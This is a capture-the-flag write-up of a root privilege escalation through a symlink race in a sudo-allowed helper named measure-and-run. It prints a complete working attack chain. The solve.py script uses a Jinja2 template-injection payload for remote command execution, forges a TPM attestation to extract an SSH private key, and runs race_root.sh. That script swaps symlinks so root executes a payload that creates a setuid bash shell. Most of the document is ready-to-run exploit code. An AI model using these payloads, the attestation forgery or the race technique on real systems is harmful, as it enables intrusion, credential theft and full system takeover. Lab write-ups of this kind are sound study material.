### Summary

`/usr/sbin/measure-and-run` is a root helper that opens the user-supplied path, hashes it against a root-owned allowlist, closes the descriptor, and then reopens the same pathname to execute it with `fexecve`. The pathname lives in a directory writable by `tpm-admin`, so a symlink swap between the two opens makes the helper approve the allowlisted `safe` binary but execute `evil`, a script that copies `/bin/bash` to `/tmp/rootbash` with mode 4755. Running that setuid copy gives effective UID 0 and reads `/root/root.txt`.

### Steps

1. Get SSH access as `tpm-admin` by completing the `keystone-user` chain, then check the sudo policy.
   ```sh
   sudo -n -l
   # (root) NOPASSWD: /usr/sbin/measure-and-run *
   ```
   The account may run `/usr/sbin/measure-and-run` with any arguments as root, without a password.

2. Compare the allowlist with the files in the writable race directory.
   ```sh
   sha256sum /home/tpm-admin/race/safe /home/tpm-admin/race/evil
   cat /etc/measure/allowed-hashes.txt
   ```
   `safe` is the allowlisted binary with SHA-256 `c79bf44242829108e323378531f4ac839513ca1fba45efd6583643526e1e9fd2`, and `allowed-hashes.txt` is root-owned. `evil` is a Bash script that creates `/tmp/rootbash` with mode 4755 when it runs as root.

3. Read the helper logic. The target helper is `/usr/sbin/measure-and-run` (a root-owned, non-stripped x86-64 PIE). Its `main` does the following, in order:
   - opens and hashes the supplied path,
   - closes that descriptor,
   - extends PCR 23,
   - validates the hash against the allowlist and prints `policy ok, launching`,
   - sleeps about 20 ms with `usleep`,
   - reopens the same pathname and calls `fexecve` on the new descriptor.

   The check and the execution use two separate opens of a path that the attacker controls, so the file that runs can differ from the file that was approved. Disassemble it with `objdump -d -Mintel --disassemble=main` if you want to confirm this.

4. Win the race. `scripts/race_root.sh` runs as `tpm-admin` and does this:
   - points `run` at `safe` and creates a FIFO for the helper's stderr,
   - starts `sudo -n /usr/sbin/measure-and-run run` in the background,
   - reads the helper's log, and when it sees `policy ok, launching`, it creates `run.next -> evil` and renames it over `run` with `mv -Tf`, which is atomic,
   - the helper's reopen after the 20 ms sleep then gets `evil`, which runs as root and creates `/tmp/rootbash`,
   - the script runs `/tmp/rootbash -p` to print the effective UID, read `/root/root.txt`, and delete the setuid copy.

   The helper output is consumed through the FIFO, so the swap happens in the window between the approval message and the second open.

5. Run the full solve from the attacker machine. `scripts/solve.py` regenerates the `tpm-admin` SSH key through the vault flaw from `keystone-user`, then streams `race_root.sh` into `bash -s` over SSH. The output shows the effective UID and the flag.
   ```sh
   ./solve.py
   # uid=1003(tpm-admin) gid=1003(tpm-admin) euid=0(root) groups=1003(tpm-admin)
   # isfcr{REDACTED}
   ```

### Scripts

#### scripts/solve.py

End-to-end solver. It needs `python3`, `openssl` and `ssh` on the attacker machine. It regenerates the `tpm-admin` credential by the same vault relay as `keystone-user` (the forged attestation), then reads `race_root.sh` from its own directory and runs it on the target. The target is hardcoded as `TARGET_HOST`. Run it with `./solve.py`.

```python
#!/usr/bin/env python3

import base64
import html
import json
import re
import shlex
import struct
import subprocess
import sys
import tempfile
import urllib.parse
import urllib.request
from pathlib import Path

TARGET_HOST = "10.49.161.199"
BASE_URL = f"http://{TARGET_HOST}"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
)


def portal_exec(command):
    shell_command = f"{command} 2>&1"
    payload = (
        "{{cycler.__init__.__globals__.os.popen("
        + repr(shell_command)
        + ").read()}}"
    )
    url = f"{BASE_URL}/review?{urllib.parse.urlencode({'doc': payload})}"
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(request, timeout=20) as response:
        body = response.read().decode()
    match = re.search(r"Requested: (.*?)</p>", body, re.DOTALL)
    if not match:
        raise RuntimeError("Remote command output was missing from the response")
    return html.unescape(match.group(1)).strip()


def vault_request(method, path, body=None):
    data = body.encode() if body is not None else None
    code = (
        "import base64,urllib.request;"
        f"r=urllib.request.Request('http://127.0.0.1:9000{path}',"
        f"data={data!r},method={method!r},"
        f"headers={{'User-Agent':{USER_AGENT!r},'Content-Type':'application/json'}});"
        "print(base64.b64encode(urllib.request.urlopen(r).read()).decode())"
    )
    output = portal_exec(f"python3 -c {shlex.quote(code)}")
    try:
        return base64.b64decode(output, validate=True)
    except ValueError as error:
        raise RuntimeError(output) from error


def build_quote(nonce, digest):
    quote = struct.pack(">IH", 0xFF544347, 0x8018)
    quote += struct.pack(">H", 0)
    quote += struct.pack(">H", len(nonce)) + nonce
    quote += bytes(17) + bytes(8)
    quote += struct.pack(">I", 0)
    quote += struct.pack(">H", len(digest)) + digest
    return quote


race_script = Path(__file__).with_name("race_root.sh").read_text()

with tempfile.TemporaryDirectory() as directory:
    temp = Path(directory)
    private_key = temp / "ak-private.pem"
    public_key = temp / "ak-public.pem"
    quote_file = temp / "quote.bin"
    signature_file = temp / "quote.sig"
    ssh_key = temp / "tpm-admin.key"
    known_hosts = temp / "known_hosts"

    subprocess.run(
        [
            "openssl",
            "genpkey",
            "-algorithm",
            "RSA",
            "-pkeyopt",
            "rsa_keygen_bits:2048",
            "-out",
            private_key,
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["openssl", "pkey", "-in", private_key, "-pubout", "-out", public_key],
        check=True,
    )

    attest_body = json.dumps({"ak_pub_pem": public_key.read_text()})
    attest = json.loads(vault_request("POST", "/attest", attest_body))
    quote = build_quote(
        bytes.fromhex(attest["nonce"]),
        bytes.fromhex(attest["expected_digest"]),
    )
    quote_file.write_bytes(quote)

    subprocess.run(
        [
            "openssl",
            "dgst",
            "-sha256",
            "-sign",
            private_key,
            "-out",
            signature_file,
            quote_file,
        ],
        check=True,
    )

    verify_body = json.dumps(
        {
            "session": attest["session"],
            "quote_msg": base64.b64encode(quote).decode(),
            "quote_sig": base64.b64encode(signature_file.read_bytes()).decode(),
        }
    )
    token = json.loads(vault_request("POST", "/verify", verify_body))["token"]
    secret_path = "/secret?" + urllib.parse.urlencode({"token": token})
    secret = json.loads(vault_request("GET", secret_path))
    key_match = re.search(
        r"-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----",
        secret["payload"],
        re.DOTALL,
    )
    if not key_match:
        raise RuntimeError("The sealed payload did not contain an OpenSSH private key")

    ssh_key.write_text(key_match.group(0) + "\n")
    ssh_key.chmod(0o600)
    result = subprocess.run(
        [
            "ssh",
            "-i",
            ssh_key,
            "-o",
            f"UserKnownHostsFile={known_hosts}",
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "BatchMode=yes",
            f"tpm-admin@{TARGET_HOST}",
            "bash",
            "-s",
        ],
        input=race_script,
        capture_output=True,
        text=True,
    )
    sys.stderr.write(result.stderr)
    sys.stdout.write(result.stdout)
    sys.exit(result.returncode)
```

#### scripts/race_root.sh

Runs on the target as `tpm-admin` (streamed over SSH by `solve.py`, or uploaded and run by hand). It performs the single safe-to-evil swap on `run` once the helper logs `policy ok, launching`, then runs the setuid copy that `evil` created and removes its own files. Run it as `bash race_root.sh` on the target, after the `tpm-admin` SSH login, and `evil` must be present in `/home/tpm-admin/race/`.

```bash
#!/bin/bash

set -u

race_dir=/home/tpm-admin/race
run_path=$race_dir/run
next_path=$race_dir/run.next
log_path=$race_dir/measure.log

rm -f "$run_path" "$next_path" "$log_path"
ln -s safe "$run_path"
mkfifo "$log_path"

sudo -n /usr/sbin/measure-and-run "$run_path" 2>"$log_path" &
helper_pid=$!

while IFS= read -r line; do
    printf '%s\n' "$line" >&2
    if [[ "$line" == *"policy ok, launching"* ]]; then
        ln -s evil "$next_path"
        mv -Tf "$next_path" "$run_path"
    fi
done <"$log_path"

wait "$helper_pid"
helper_status=$?
rm -f "$run_path" "$next_path" "$log_path"

if [[ -u /tmp/rootbash ]]; then
    /tmp/rootbash -p -c 'id; cat /root/root.txt; rm -f /tmp/rootbash'
    exit $?
fi

exit "$helper_status"
```

#### artifacts/evil

Pre-existing payload in `/home/tpm-admin/race/` on the target. It is executed as root through the race and creates the setuid Bash copy. It is not run by hand.

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash && echo PWNED-$$
```

### Notes

- The target address is volatile and is hardcoded as `TARGET_HOST` in `solve.py`. Re-verify the `keystone-user` foothold before running it on a redeployed box.
- The race is timing based. The helper sleeps about 20 ms between the approval message and the second open, and `race_root.sh` swaps the symlink as soon as it reads the log line. The validated runs both succeeded on the first attempt.
- `measure-and-run` is a non-stripped binary with SHA-256 `6857817e5c6c4cbf7851fd71b92a41d3a6983522ef2acb7625b20046cdacf19e`. `safe` is a stripped ELF whose hash is on the allowlist, and the allowlist itself is root-owned, so only the path is attacker controlled.
- The script removes `/tmp/rootbash`, the `run`, `run.next` and log files, and the uploaded script, so the target is left without a setuid shell after a run.
- Only `artifacts/measure-and-run` and `artifacts/safe` are binaries and are not embedded. They are needed only for static analysis and hash checks.
